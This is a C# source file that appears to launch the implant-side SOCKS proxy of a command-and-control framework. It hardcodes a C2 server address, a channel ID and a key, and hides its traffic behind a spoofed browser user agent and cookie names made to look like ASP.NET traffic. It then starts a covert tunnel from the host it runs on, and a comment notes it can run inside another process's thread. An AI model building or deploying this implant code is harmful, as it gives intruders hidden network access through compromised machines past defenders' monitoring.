using ImplantSide.Classes.Helpers;
using System.Collections.Generic;
using System;
using System.Security;
using SocksProxy.Classes.Integration;
using System.Reflection;

namespace SocksLauncher
{
    class Program
    {
        static LogToConsole comms = new LogToConsole();
        static void Main(string[] args)
        {
            String serverUri = "http://10.10.10.2:8081";
            String commandChannelId = "7f404221-9f30-470b-b05d-e1a922be3ff6";
            String payloadCookieName = "__RequestVerificationToken";
            String sessionCookieName = "ASP.NET_SessionId";
            String userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36";
            String dfHost = null;
            String key = "Y/z8YmjExk7fO+QQ68MxVAp9G+TT17hRTYx64A01YTo=";
            bool useProxy = false;
            bool userDefinedProxy = false; //System.Net.HttpWebRequest.GetSystemWebProxy()

            var result = Uri.TryCreate(serverUri, UriKind.Absolute, out Uri parsedServerUri);
            if (!result)
               Console.WriteLine($"Server URI {serverUri} is not valid");

            SecureString secKey = null;
            secKey = new SecureString();
            foreach (var n in key) secKey.AppendChar(n);

            var sock = PoshCreateProxy.CreateSocksController(parsedServerUri,
                commandChannelId,
                dfHost,
                userAgent,
                secKey,
                new List<String> { "Upload" },
                sessionCookieName, payloadCookieName,
                (useProxy) ? ((userDefinedProxy) ? null : System.Net.HttpWebRequest.GetSystemWebProxy()) : null,
                200,
                comms);

            sock.Start();
            //Comment this out to have it run inside a thread in a process. Uncomment it to have it run as a standalone binary.
            //Console.ReadLine();

        }
    }
}
